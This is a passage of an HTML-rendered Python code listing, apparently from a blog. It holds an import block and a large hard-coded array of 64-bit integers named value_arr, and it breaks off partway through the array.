class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">value_arr = [</span><br><span class="line">[<span class="number">8867289026099616930</span>, <span class="number">3100388368458364911</span>, <span class="number">11012612612822111152</span>, <span class="number">3553763262634053301</span>, <span class="number">5401992163525506830</span>, <span class="number">3802577809068939019</span>, <span class="number">4123451793823069756</span>, <span class="number">7817012668148538993</span>, <span class="number">4418295964672193722</span>, <span class="number">9714516383028541031</span>],</span><br><span class="line">[<span class="number">14895006062848545614</span>, <span class="number">13184494282524308555</span>, <span class="number">5839645882409261180</span>, <span class="number">15553940338338437553</span>, <span class="number">3310727070198197498</span>, <span class="number">7079238959161008039</span>, <span class="number">8852142265661212744</span>, <span class="number">2055261898208476077</span>, <span class="number">12685862460417988070</span>, <span class="number">8327538304492250947</span>],</span><br><span class="line">[<span class="number">16833079321975897880</span>, <span class="number">17784340646344753597</span>, <span class="number">9634395732957591606</span>, <span class="number">690518920529962707</span>, <span class="number">10752317369148323620</span>, <span class="number">4040135522852265209</span>, <span class="number">2068189971163025250</span>, <span class="number">13577899494281881007</span>, <span class="number">14537861419972208752</span>, <span class="number">6988257997766616693</span>],</span><br><span class="line">[<span class="number">8811210512227857652</span>, <span class="number">17677714985016526345</span>, <span class="number">2277225101309911218</span>, <span class="number">9554579400707461183</span>, <span class="number">13629936068980515136</span>, <span class="number">18128385074177963653</span>, <span class="number">14926717179739533854</span>, <span class="number">15372561348002497115</span>, <span class="number">9242320810727858892</span>, <span class="number">10530837434097508673</span>],</span><br><span class="line">[<span class="number">2991159697670699038</span>, <span class="number">3475834328473165915</span>, <span class="number">24895706424277196</span>, <span class="number">1717803743275126593</span>, <span class="number">7847993843726425290</span>, <span class="number">6555997079546348215</span>, <span class="number">9641940719668788120</span>, <span class="number">1211123003602522173</span>, <span class="number">9780510953735823542</span>, <span class="number">10772469154227966291</span>],</span><br><span class="line">[<span class="number">3185088266943822372</span>, <span class="number">16856905608318675961</span>, <span class="number">981610330286889570</span>, <span class="number">12390880568666725551</span>, <span class="number">6420531847364688752</span>, <span class="number">294839699134285173</span>, <span class="number">1897195166556125390</span>, <span class="number">1779257976405790667</span>, <span class="number">12088335929742246396</span>, <span class="number">3991695835285178673</span>],</span><br><span class="line">[<span class="number">10238209914032284972</span>, <span class="number">5460209267264701729</span>, <span class="number">7819557967073387050</span>, <span class="number">4593921590486709655</span>, <span class="number">3385940490520588792</span>, <span class="number">12268964961406007325</span>, <span class="number">16455099020084682774</span>, <span class="number">10150443889560462899</span>, <span class="number">17851097652418530308</span>, <span class="number">14240629152048184665</span>],</span><br><span class="line">[<span class="number">8349943537494362534</span>, <span class="number">4297037802114914819</span>, <span class="number">1347703166576296724</span>, <span class="number">757798125216715945</span>, <span class="number">15394582492534297042</span>, <span class="number">10761779783422053855</span>, <span class="number">4693042107739651424</span>, <span class="number">10225256180973570853</span>, <span class="number">4566401686213427518</span>, <span class="number">1487067095664121339</span>],</span><br><span class="line">[<span class="number">11987973417146959732</span>, <span class="number">15513426539919950473</span>, <span class="number">515274979322588978</span>, <span class="number">17107229499549087935</span>, <span class="number">18253958825185315776</span>, <span class="number">5144561925537278725</span>, <span class="number">4486635461590751390</span>, <span class="number">14429941670409020123</span>, <span class="number">17988539351616152908</span>, <span class="number">5277362322974592449</span>],</span><br><span class="line">[<span class="number">3272875691678361420</span>, <span class="number">4467493841292318657</span>, <span class="number">13109169869817161546</span>, <span class="number">642261405616117559</span>, <span class="number">7422548840093008408</span>, <span class="number">14093779976259686589</span>, <span class="number">13240126529021690678</span>, <span class="number">9678270890728627667</span>, <span class="number">3717904806731450916</span>, <span class="number">16727758706245942265</span>],</span><br><span class="line">[<span class="number">13961749608401819040</span>, <span class="number">4130031146828829797</span>, <span class="number">8270988025545981822</span>, <span class="number">17295851551386197307</span>, <span class="number">12822136328236310828</span>, <span class="number">17730435183956521249</span>, <span class="number">5914918828169559594</span>, <span class="number">2301029522089476503</span>, <span class="number">11197084434497465848</span>, <span class="number">16282318958233527325</span>],</span><br><span class="line">[<span class="number">13935820998792231868</span>, <span class="number">2340957083767314929</span>, <span class="number">13952086190268317242</span>, <span class="number">3463255295617205735</span>, <span class="number">17603686513072576392</span>, <span class="number">15616004610886916077</span>, <span class="number">7593161876043215654</span>, <span class="number">7419335383114434947</span>, <span class="number">13872051444738117780</span>, <span class="number">16387601927742994473</span>],</span><br><span class="line">[<span class="number">2367708137021733318</span>, <span class="number">15797908864823186083</span>, <span class="number">1697811323936294452</span>, <span class="number">6468516909347007561</span>, <span class="number">3605808975914282994</span>, <span class="number">8993146379861355647</span>, <span class="number">11784545778018336384</span>, <span class="number">1476919440044939461</span>, <span class="number">9673720994553064798</span>, <span class="number">3403961970617612955</span>],</span><br><span class="line">[<span class="number">14632104118495609642</span>, <span class="number">13491004195881278103</span>, <span class="number">8542085830330608376</span>, <span class="number">17554856007815877917</span>, <span class="number">12246699748174721302</span>, <span class="number">14918799307125947187</span>, <span class="number">14826228137665017092</span>, <span class="number">8438817444860840537</span>, <span class="number">10429337410401897026</span>, <span class="number">201262443058381839</span>],</span><br><span class="line">[<span class="number">727242865172403940</span>, <span class="number">13286269549476768697</span>, <span class="number">12862139302129010978</span>, <span class="number">2043896308843279983</span>, <span class="number">11901636794219457584</span>, <span class="number">9556199557922302261</span>, <span class="number">13741726916804549518</span>, <span class="number">7395209500326784395</span>, <span class="number">12207365532390229692</span>, <span class="number">12204738417996026097</span>],</span><br><span class="line">[<span class="number">5226361193323484432</span>, <span class="number">10130784938838945173</span>, <span class="number">16494630052633807214</span>, <span class="number">12878085135450049259</span>, <span class="number">3144158807994921372</span>, <span class="number">14032772940844506961</span>, <span class="number">9030641085374296346</span>, <span class="number">14371680458411244615</span>, <span class="number">13968515723769642856</span>, <span class="number">4596893107208673101</span>],</span><br><span class="line">[<span class="number">5582569318269685702</span>, <span class="number">16262401486417281187</span>, <span class="number">15301058140219305012</span>, <span class="number">4308599473687603785</span>, <span class="number">2145458505091835378</span>, <span class="number">462684261660228223</span>, <span class="number">13478469980846195840</span>, <span class="number">7677224992909932229</span>, <span class="number">13219690446917878622</span>, <span class="number">8268181225565595803</span>],</span><br><span class="line">[<span class="number">1523660276195024986</span>, <span class="number">12898838688908966023</span>, <span class="number">4576153996660178088</span>, <span class="number">2159976516489910669</span>, <span class="number">1464427048127423302</span>, <span class="number">8811745952244449827</span>, <span class="number">17714660346161386420</span>, <span class="number">4826455020305256393</span>, <span class="number">984003074290762098</span>, <span class="number">12555979904933929983</span>],</span><br><span class="line">[<span class="number">126547082954464156</span>, <span class="number">8731748723858026833</span>, <span class="number">12194851587498199834</span>, <span class="number">11341276220445965895</span>, <span class="number">7784808114970478952</span>, <span class="number">2196181795386050893</span>, <span class="number">3962591291961098758</span>, <span class="number">15164382113382091747</span>, <span class="number">13324697695629440116</span>, <span class="number">15513681386663338889</span>],</span><br><span class="line">[<span class="number">2109089224935408226</span>, <span class="number">16399948004576306351</span>, <span class="number">6345023819482489712</span>, <span class="number">13531529848972103029</span>, <span class="number">11338355893597528270</span>, <span class="number">7583305562428282827</span>, <span class="number">6739249743684069884</span>, <span class="number">3839630471462031665</span>, <span class="number">6680085498946462330</span>, <span class="number">18204041658276662055</span>],</span><br><span class="line">[<span class="number">14630982926170580926</span>, <span class="number">13413641925454296699</span>, <span class="number">3204089170868891500</span>, <span class="number">18167967979148445793</span>, <span class="number">17657937622702801514</span>, <span class="number">912587101662897879</span>, <span class="number">7628277793611298872</span>, <span class="number">9842333695312176989</span>, <span class="number">15038238322996354134</span>, <span class="number">4620776159013544819</span>],</span><br><span class="line">[<span class="number">14704701709580170488</span>, <span class="number">53493907006424861</span>, <span class="number">3691079583443315478</span>, <span class="number">14876818299364597043</span>, <span class="number">11929538602131857156</span>, <span class="number">11481424303877872729</span>, <span class="number">17455025871772050498</span>, <span class="number">5358420361150629391</span>, <span class="number">796123445202395728</span>, <span class="number">18039029571546202069</span>],</span><br><span class="line">[<span class="number">18200670961985626810</span>, <span class="number">1467699364758740071</span>, <span class="number">9037535799805306888</span>, <span class="number">14847415754150972013</span>, <span class="number">9900762982391730086</span>, <span class="number">623115057775966211</span>, <span class="number">6101450839122565396</span>, <span class="number">15171738277846876841</span>, <span class="number">13832273043699611602</span>, <span class="number">13642892256086068191</span>],</span><br><span class="line">[<span class="number">2782294491294682690</span>, <span class="number">7510879162237589519</span>, <span class="number">1741828130526231632</span>, <span class="number">9505676564052672981</span>, <span class="number">10255640339800129198</span>, <span class="number">6662908645245953323</span>, <span class="number">17018838752941540572</span>, <span class="number">12154997309264547729</span>, <span class="number">8591331022323970650</span>, <span class="number">2506030181648323207</span>],</span><br><span class="line">[<span class="number">11234052632499834174</span>, <span class="number">386380546687390203</span>, <span class="number">8213513647720372460</span>, <span class="number">13330119481419151329</span>, <span class="number">15887784606153412586</span>, <span class="number">7899237475721923159</span>, <span class="number">10091807687235701176</span>, <span class="number">13805199692009971421</span>, <span class="number">11774830989500895702</span>, <span class="number">806599032341532403</span>],</span><br><span class="line">[<span class="number">8300049183692798058</span>, <span class="number">854327389806965975</span>, <span class="number">3608357675551997496</span>, <span class="number">9169006654863656285</span>, <span class="number">5472160679467528790</span>, <span class="number">8644205409068454259</span>, <span class="number">6154362867017692228</span>, <span class="number">375924128901076633</span>, <span class="number">7492020820464736130</span>, <span class="number">440602548199347791</span>],</span><br><span class="line">[<span class="number">11558370982278543894</span>, <span class="number">4317602607708809267</span>, <span class="number">2766674752555013636</span>, <span class="number">6433117189200424793</span>, <span class="number">1163228285800072002</span>, <span class="number">6475775425366761743</span>, <span class="number">4106646581277321552</span>, <span class="number">6657453002491912917</span>, <span class="number">16642399402912752558</span>, <span class="number">4627426230987726379</span>],</span><br><span class="line">[<span class="number">9176831416081544290</span>, <span class="number">6012069203501801135</span>, <span class="number">9004405420014142832</span>, <span class="number">12561419548560652149</span>, <span class="number">18187721460045624014</span>, <span class="number">574183730898547147</span>, <span class="number">2725189284580649980</span>, <span class="number">3570619898969332529</span>, <span class="number">6565100070659773562</span>, <span class="number">10270047106495137063</span>],</span><br><span class="line">[<span class="number">13677842479808722104</span>, <span class="number">2987183347614692829</span>, <span class="number">3201466174608737494</span>, <span class="number">17986981237197819379</span>, <span class="number">5169852428109578948</span>, <span class="number">6231680139079466777</span>, <span class="number">5710815901163520514</span>, <span class="number">6664671632382331599</span>, <span class="number">17140484865351641616</span>, <span class="number">2101834991851968149</span>],</span><br><span class="line">[<span class="number">4633588486946452916</span>, <span class="number">6122956346242873801</span>, <span class="number">16655618269148156786</span>, <span class="number">5539528001230618111</span>, <span class="number">13292550610721617408</span>, <span class="number">13295532528023572037</span>, <span class="number">13501284821858441438</span>, <span class="number">9251449022754878491</span>, <span class="number">11160684063961861004</span>, <span class="number">13770693391276793089</span>],</span><br><span class="line">[<span class="number">17299383331387067396</span>, <span class="number">13065829148296346969</span>, <span class="number">16098495694389463362</span>, <span class="number">3991558490299875087</span>, <span class="number">17163118798757658448</span>, <span class="number">3663576396867129557</span>, <span class="number">12979098425607768494</span>, <span class="number">10114075828877548587</span>, <span class="number">15341701465297442780</span>, <span class="number">7112988904079109777</span>],</span><br><span class="line">[<span class="number">1428568366097891942</span>, <span class="number">6337496892206785987</span>, <span class="number">13012171866948546004</span>, <span class="number">12396143281391196777</span>, <span class="number">6783659025353203346</span>, <span class="number">6903870906632240543</span>, <span class="number">15198490714885807136</span>, <span class="number">15678191199385801957</span>, <span class="number">11884036482466341374</span>, <span class="number">8341778046957283771</span>],</span><br><span class="line">[<span class="number">12077661547009871844</span>, <span class="number">3255163426751334585</span>, <span class="number">3245347561327467042</span>, <span class="number">2568052847080606575</span>, <span class="number">11174949785175889200</span>, <span class="number">14755028155044738613</span>, <span class="number">3526018644061625486</span>, <span class="number">3487613482027987595</span>, <span class="number">837657301706973116</span>, <span class="number">2458121596652490225</span>],</span><br><span class="line">[<span class="number">5523160823405994428</span>, <span class="number">12163215340822583281</span>, <span class="number">9158375199828423738</span>, <span class="number">4738590282036483047</span>, <span class="number">13368080207454952840</span>, <span class="number">60330628914165229</span>, <span class="number">4162813395077400870</span>, <span class="number">10532963154697385859</span>, <span class="number">7351438799447111316</span>, <span class="number">9187187171692787241</span>],</span><br><span class="line">[<span class="number">873931018331865996</span>, <span class="number">4961008043770098945</span>, <span class="number">10268161693364898186</span>, <span class="number">7526882041215013495</span>, <span class="number">2846026779968485976</span>, <span class="number">11908407080730016253</span>, <span class="number">10023349327150850422</span>, <span class="number">9081572846155269395</span>, <span class="number">17885971952298384996</span>, <span class="number">16646955843758158137</span>],</span><br><span class="line">[<span class="number">14117057574820939498</span>, <span class="number">14846280829748141399</span>, <span class="number">9822453198596417720</span>, <span class="number">13666484049608964573</span>, <span class="number">2203451663831423190</span>, <span class="number">4464212214691787251</span>, <span class="number">12882737634380494532</span>, <span class="number">3465181234195645209</span>, <span class="number">17736576274984900098</span>, <span class="number">6338654109127700175</span>],</span><br><span class="line">[<span class="number">5658271824067632014</span>, <span class="number">3039130312766025099</span>, <span class="number">6785806770050664124</span>, <span class="number">7052065290757034225</span>, <span class="number">6977159145787019578</span>, <span class="number">1808635142856008935</span>, <span class="number">14115360414807306888</span>, <span class="number">14729176788807491309</span>, <span class="number">1742274373691561510</span>, <span class="number">9536467342460434563</span>],</span><br><span class="line">[<span class="number">8457322449329128800</span>, <span class="number">11706182718713787173</span>, <span class="number">14516612421740595518</span>, <span class="number">5522077119785303547</span>, <span class="number">12088439790994912492</span>, <span class="number">3998862261719139297</span>, <span class="number">17667079026686888938</span>, <span class="number">1543343976564930135</span>, <span class="number">14257014014432421304</span>, <span class="number">6056531089230834397</span>],</span><br><span class="line">[<span class="number">5853949490429562094</span>, <span class="number">16540889291739200619</span>, <span class="number">16069972633722194204</span>, <span class="number">2023467304258303185</span>, <span class="number">10492035477856058522</span>, <span class="number">4527429097395525063</span>, <span class="number">17244702540938403560</span>, <span class="number">9292854607338542285</span>, <span class="number">14017669400234662790</span>, <span class="number">7988496783295048547</span>],</span><br><span class="line">[<span class="number">8990859015354022950</span>, <span class="number">11626717627012380291</span>, <span class="number">9033521094343520660</span>, <span class="number">14570401077287722281</span>, <span class="number">9233494352537050194</span>, <span class="number">9921811818931708511</span>, <span class="number">2075484779034477536</span>, <span class="number">14081241237412088741</span>, <span class="number">12374953548537439166</span>, <span class="number">5321567458443928187</span>],</span><br><span class="line">[<span class="number">2501824620693468540</span>, <span class="number">6605202164463364785</span>, <span class="number">13037091578942931450</span>, <span class="number">14115603409003792551</span>, <span class="number">14745943388365002056</span>, <span class="number">2899169743159803053</span>, <span class="number">15575271540930894566</span>, <span class="number">4782580049077731395</span>, <span class="number">16403374133301088852</span>, <span class="number">6581426701492482281</span>],</span><br><span class="line">[<span class="number">10614745564617910298</span>, <span class="number">12994425083963297607</span>, <span class="number">11171615255409057384</span>, <span class="number">14524945601133343309</span>, <span class="number">6097066497884901126</span>, <span class="number">14869218732448042211</span>, <span class="number">11405168484889573748</span>, <span class="number">12193374361579420809</span>, <span class="number">11239347632050213170</span>, <span class="number">751735515663540927</span>],</span><br><span class="line">[<span class="number">11822229604799408924</span>, <span class="number">4077103487938944721</span>, <span class="number">4618979562143911578</span>, <span class="number">5114940534867521479</span>, <span class="number">2442759505377501416</span>, <span class="number">2529709207661633229</span>, <span class="number">8529238665266728326</span>, <span class="number">16668401618408154467</span>, <span class="number">6421579100170458100</span>, <span class="number">367100142732370185</span>],</span><br><span class="line">[<span class="number">5451434008959662308</span>, <span class="number">7214065144025667001</span>, <span class="number">18155149021322681122</span>, <span class="number">16773429532725039215</span>, <span class="number">13668505188035505712</span>, <span class="number">2342910215262761781</span>, <span class="number">14086852263454150030</span>, <span class="number">12762114345439668107</span>, <span class="number">13588918370988173500</span>, <span class="number">15298163912706390769</span>],</span><br><span class="line">[<span class="number">2298694336461850902</span>, <span class="number">11035956626191299379</span>, <span class="number">5164500185108040964</span>, <span class="number">5862375371973345881</span>, <span class="number">17122275118260281922</span>, <span class="number">845362442548149263</span>, <span class="number">2989776314693644368</span>, <span class="number">3380380903056393685</span>, <span class="number">11885353426376544942</span>, <span class="number">8432647176761329963</span>],</span><br><span class="line">[<span class="number">15069683516895607374</span>, <span class="number">6790494538062018379</span>, <span class="number">7375521283540477820</span>, <span class="number">10848878574135076017</span>, <span class="number">10702858666938180602</span>, <span class="number">627485070352396967</span>, <span class="number">6402981706896287560</span>, <span class="number">17530624080524154541</span>, <span class="number">10574696765045808358</span>, <span class="number">10231057913488263747</span>],</span><br><span class="line">[<span class="number">11711156544779800568</span>, <span class="number">14859806420295519773</span>, <span class="number">10755718946365525526</span>, <span class="number">4274844350839196723</span>, <span class="number">18263099102261299716</span>, <span class="number">5775241043780170585</span>, <span class="number">11110006472931186498</span>, <span class="number">10273939610160252175</span>, <span class="number">7925558300094438736</span>, <span class="number">11907944568939275989</span>],</span><br><span class="line">[<span class="number">10746209935196001034</span>, <span class="number">3618722580142006775</span>, <span class="number">9884185071574296536</span>, <span class="number">17925983285082602877</span>, <span class="number">960993732159640310</span>, <span class="number">10968335297886526611</span>, <span class="number">498628532078719972</span>, <span class="number">15958624639722126521</span>, <span class="number">12787199791963184674</span>, <span class="number">15319814181110816623</span>],</span><br><span class="line">[<span class="number">17924571917219383696</span>, <span class="number">863609349597516821</span>, <span class="number">4248812901100005870</span>, <span class="number">16466929070257130859</span>, <span class="number">10966717351459380764</span>, <span class="number">386990228605656529</span>, <span class="number">8255581700080748954</span>, <span class="number">16232815094285129415</span>, <span class="number">13259597083100832744</span>, <span class="number">11021739122189430221</span>],</span><br><span class="line">[<span class="number">2798086452070131370</span>, <span class="number">8600524455743548439</span>, <span class="number">3140377087599190648</span>, <span class="number">13771834233539087005</span>, <span class="number">9472614355009870998</span>, <span class="number">7974347915846792371</span>, <span class="number">15274428055851676804</span>, <span class="number">2471123652321257433</span>, <span class="number">4486835346780798402</span>, <span class="number">14443733748522263951</span>],</span><br><span class="line">[<span class="number">364510442556624052</span>, <span class="number">6704476462697508041</span>, <span class="number">1440274083389264498</span>, <span class="number">7145191385311492351</span>, <span class="number">13402859670044630272</span>, <span class="number">2460113547601908037</span>, <span class="number">3727138121145690078</span>, <span class="number">17364857400828444443</span>, <span class="number">17583539939751363212</span>, <span class="number">14225891051723206657</span>],</span><br><span class="line">[<span class="number">10679737800641080988</span>, <span class="number">17478889369562075217</span>, <span class="number">7005001708662335002</span>, <span class="number">3729771981252773191</span>, <span class="number">17546593748217179240</span>, <span class="number">11676603835864512589</span>, <span class="number">12475669505140649222</span>, <span class="number">12270968464065422051</span>, <span class="number">16593340703584298868</span>, <span class="number">1242375977324421769</span>],</span><br><span class="line">[<span class="number">4495563215113416740</span>, <span class="number">15045956663472929273</span>, <span class="number">5153341651897229410</span>, <span class="number">5092436580427348655</span>, <span class="number">889986649005576560</span>, <span class="number">6068846560256127861</span>, <span class="number">12922043036062686926</span>, <span class="number">6177253950266920395</span>, <span class="number">1955408873097820156</span>, <span class="number">5796003727782729521</span>],</span><br><span class="line">[<span class="number">17028974797201535468</span>, <span class="number">12854384363204195553</span>, <span class="number">1508805523031015658</span>, <span class="number">11873860720592322391</span>, <span class="number">7639650477649973944</span>, <span class="number">10627048893980756957</span>, <span class="number">13843354809999717078</span>, <span class="number">14407534130793346035</span>, <span class="number">16442419118134640836</span>, <span class="number">9275530655007569177</span>],</span><br><span class="line">[<span class="number">246905628842646592</span>, <span class="number">17036488390142614917</span>, <span class="number">13372822276138677534</span>, <span class="number">387533368091169115</span>, <span class="number">8293058324581117388</span>, <span class="number">371958111100999745</span>, <span class="number">7218365592259430858</span>, <span class="number">5135875742835639</span>, <span class="number">354375426255659160</span>, <span class="number">6005160337930930493</span>],</span><br><span class="line">[<span class="number">15492028295530370278</span>, <span class="number">17485540190151107139</span>, <span class="number">7463908329305537620</span>, <span class="number">16947584731924202217</span>, <span class="number">7238469859068201234</span>, <span class="number">1392330285547991583</span>, <span class="number">3837069334263661216</span>, <span class="number">6503367032258901349</span>, <span class="number">6010467456834954366</span>, <span class="number">8893884900001715771</span>],</span><br><span class="line">[<span class="number">15432599508868324242</span>, <span class="number">13384953910469930655</span>, <span class="number">1224616136947634464</span>, <span class="number">10711537154548571621</span>, <span class="number">1226300715469377278</span>, <span class="number">10827773072548825787</span>, <span class="number">9246579057486914732</span>, <span class="number">10824656460472361633</span>, <span class="number">9031532824210888106</span>, <span class="number">14433210438136076055</span>],</span><br><span class="line">[<span class="number">7575212830376199740</span>, <span class="number">6180851232090336881</span>, <span class="number">2203621318913557690</span>, <span class="number">4475918415359067751</span>, <span class="number">13690465480422849032</span>, <span class="number">3858170389989450861</span>, <span class="number">7959339877338386854</span>, <span class="number">14238873398771696131</span>, <span class="number">4804828608640797460</span>, <span class="number">17938524743152647337</span>],</span><br><span class="line">[<span class="number">13784859698773207124</span>, <span class="number">10371371456164159209</span>, <span class="number">14648355674364024082</span>, <span class="number">14612361550801874463</span>, <span class="number">12128767025013550752</span>, <span class="number">6781441409005179237</span>, <span class="number">6750855378618577022</span>, <span class="number">4640419281943024187</span>, <span class="number">6594281201006291500</span>, <span class="number">12283545100404874785</span>],</span><br><span class="line">[<span class="number">7300966056528243488</span>, <span class="number">5704567910290907109</span>, <span class="number">6233560262172006654</span>, <span class="number">5840544394548772027</span>, <span class="number">15615937675964685996</span>, <span class="number">7588543366409340065</span>, <span class="number">7100658218377019306</span>, <span class="number">10330071151565990167</span>, <span class="number">11798634657090360184</span>, <span class="number">2449052096014581661</span>],</span><br><span class="line">[<span class="number">8154703422438920430</span>, <span class="number">9272213936998961259</span>, <span class="number">12593463146803571996</span>, <span class="number">1951985665097541841</span>, <span class="number">5559802375763525786</span>, <span class="number">14691482453492246983</span>, <span class="number">17588109310649254632</span>, <span class="number">14541177643677714637</span>, <span class="number">7217077433446522758</span>, <span class="number">18362996991361728355</span>],</span><br><span class="line">[<span class="number">11535030875503939418</span>, <span class="number">2707135240261100423</span>, <span class="number">2324890840920413096</span>, <span class="number">12843515433832090765</span>, <span class="number">758849396355785286</span>, <span class="number">15467120201130081571</span>, <span class="number">15766881676531186356</span>, <span class="number">18003679405497864905</span>, <span class="number">6322026040812720242</span>, <span class="number">11944683120758009599</span>],</span><br><span class="line">[<span class="number">17075843071584444188</span>, <span class="number">16088295295624897233</span>, <span class="number">3287730975544812186</span>, <span class="number">5492508428077421511</span>, <span class="number">10048200063151052008</span>, <span class="number">10796273630169178829</span>, <span class="number">7073117533291274630</span>, <span class="number">8429763880649607523</span>, <span class="number">9804641479826819060</span>, <span class="number">12437475454506657033</span>],</span><br><span class="line">[<span class="number">16044771336982165142</span>, <span class="number">284577829196297907</span>, <span class="number">1189126140835004036</span>, <span class="number">8262727422777072089</span>, <span class="number">16725869960331425730</span>, <span class="number">10386894692876175247</span>, <span class="number">15719459007493130704</span>, <span class="number">14731515241872024917</span>, <span class="number">1903627635144380462</span>, <span class="number">2223098308995390635</span>],</span><br><span class="line">[<span class="number">6279808029989953894</span>, <span class="number">9031640373987131587</span>, <span class="number">14440631372696876244</span>, <span class="number">279384735768673641</span>, <span class="number">830802694328929682</span>, <span class="number">1985153687567493279</span>, <span class="number">7848395926190175008</span>, <span class="number">6583740769545078757</span>, <span class="number">11556255329581195518</span>, <span class="number">4171622571591771323</span>],</span><br><span class="line">[<span class="number">13622640050209395886</span>, <span class="number">17624959778970735403</span>, <span class="number">17083859957859887836</span>, <span class="number">16641460448630508945</span>, <span class="number">4562638385512917082</span>, <span class="number">1227399347328901255</span>, <span class="number">10903578670855980200</span>, <span class="number">14477165340680569229</span>, <span class="number">2800228526643489606</span>, <span class="number">8748327601305266723</span>],</span><br><span class="line">[<span class="number">16556262401654887454</span>, <span class="number">17130717217904585819</span>, <span class="number">1427867318005118156</span>, <span class="number">6289124573805394753</span>, <span class="number">9674481897252550858</span>, <span class="number">3456464256882151095</span>, <span class="number">17135104840353806232</span>, <span class="number">1730613267001326653</span>, <span class="number">8731850980834229430</span>, <span class="number">12201907318856179027</span>],</span><br><span class="line">[<span class="number">15640468007513841174</span>, <span class="number">9281136243301047347</span>, <span class="number">13209102281647512068</span>, <span class="number">7537597821910303577</span>, <span class="number">3585415647943501634</span>, <span class="number">7586006749877441807</span>, <span class="number">6925631677676039504</span>, <span class="number">16699983916907935445</span>, <span class="number">8600757696655345582</span>, <span class="number">3156470710513193515</span>],</span><br><span class="line">[<span class="number">17890772352087682590</span>, <span class="number">16978183429219692123</span>, <span class="number">9349779972457004748</span>, <span class="number">17945519593408572737</span>, <span class="number">2308999006651560650</span>, <span class="number">11746978869281271991</span>, <span class="number">17331546810897047960</span>, <span class="number">15285109234485005885</span>, <span class="number">3208124978020964022</span>, <span class="number">18446438672641449811</span>],</span><br><span class="line">[<span class="number">13796524676963936198</span>, <span class="number">11176254951324465315</span>, <span class="number">14845084619296490548</span>, <span class="number">9739914677432509001</span>, <span class="number">7971326089299262962</span>, <span class="number">15065922024072147583</span>, <span class="number">6530951533243292800</span>, <span class="number">7913798024757964485</span>, <span class="number">11096485570722552670</span>, <span class="number">9340997357764518043</span>],</span><br><span class="line">[<span class="number">11966373344999219742</span>, <span class="number">14023021561725891163</span>, <span class="number">8357795926189806284</span>, <span class="number">4838852622100533569</span>, <span class="number">1839437598164887242</span>, <span class="number">16240729831119910071</span>, <span class="number">13805713924700698008</span>, <span class="number">11810313045161030205</span>, <span class="number">3254860872890813110</span>, <span class="number">3224471344951485267</span>],</span><br><span class="line">[<span class="number">8672143706284035152</span>, <span class="number">8082105374892773845</span>, <span class="number">4262948656314846894</span>, <span class="number">17442296180081161515</span>, <span class="number">4480071634479289564</span>, <span class="number">13977037599718154129</span>, <span class="number">5184902547655950938</span>, <span class="number">7270138387779134087</span>, <span class="number">3577458766602358440</span>, <span class="number">7036981937338561421</span>],</span><br><span class="line">[<span class="number">4549989384680726506</span>, <span class="number">354618289907751511</span>, <span class="number">6021917929925302712</span>, <span class="number">9683967543235751645</span>, <span class="number">4110973829723005398</span>, <span class="number">6956033145244098291</span>, <span class="number">350941105394440132</span>, <span class="number">5768192198506817561</span>, <span class="number">10623636149069827842</span>, <span class="number">13607875411145608143</span>],</span><br><span class="line">[<span class="number">3046495147871464342</span>, <span class="number">7293980392325971891</span>, <span class="number">5222557080334166916</span>, <span class="number">9868301142576036569</span>, <span class="number">16829992184202665154</span>, <span class="number">17571328139991695503</span>, <span class="number">13383276868306134736</span>, <span class="number">1108900227645716053</span>, <span class="number">2727139412716201262</span>, <span class="number">3705178740322370987</span>],</span><br><span class="line">[<span class="number">13457706418191751024</span>, <span class="number">6244539169753239925</span>, <span class="number">6598089017653867726</span>, <span class="number">12546284449087634379</span>, <span class="number">17143399596407397884</span>, <span class="number">2302951434699150641</span>, <span class="number">11329696404564981370</span>, <span class="number">6985800819182546727</span>, <span class="number">2404910607147382216</span>, <span class="number">18364879303492960045</span>],</span><br><span class="line">[<span class="number">10190231849411736798</span>, <span class="number">2149722808446877723</span>, <span class="number">756921193158150028</span>, <span class="number">15334074180493248769</span>, <span class="number">6586706252589723018</span>, <span class="number">11760873659661649527</span>, <span class="number">18290287347143097944</span>, <span class="number">7651229940624248317</span>, <span class="number">11426031839205688694</span>, <span class="number">13632945809391352083</span>],</span><br><span class="line">[<span class="number">1186609885310298992</span>, <span 